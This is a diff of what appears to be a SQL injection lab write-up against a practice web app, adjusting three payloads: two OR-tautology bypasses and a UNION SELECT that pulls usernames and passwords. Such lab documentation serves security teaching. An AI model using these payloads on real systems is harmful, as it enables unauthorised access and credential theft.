@@ -31,7 +31,7 @@ One valid ID in, one matching row out. This confirms the field takes raw input a
 
 ## Payload 1 — Logic-based bypass
 
-**Payload:** `1' OR '1'='1`
+**Payload:** `1' OR '1'='1 `
 
 **Result:** returned all 5 users (admin, Gordon Brown, Hack Me, Pablo Picasso, Bob Smith) instead of just one.
 
@@ -45,7 +45,7 @@ SELECT first_name, last_name FROM users WHERE user_id = '1' OR '1'='1';
 
 ## Payload 2 — Comment-terminated bypass
 
-**Payload:** `1' OR '1'='1' --`
+**Payload:** `1' OR '1'='1' -- `
 
 **Result:** same output as Payload 1 — all 5 users returned.
 
@@ -55,7 +55,7 @@ SELECT first_name, last_name FROM users WHERE user_id = '1' OR '1'='1';
 
 ## Payload 3 — UNION-based data exfiltration
 
-**Payload:** `999' UNION SELECT user, password FROM users --`
+**Payload:** `999' UNION SELECT user, password FROM users -- `
 
 **Result:**
 ```
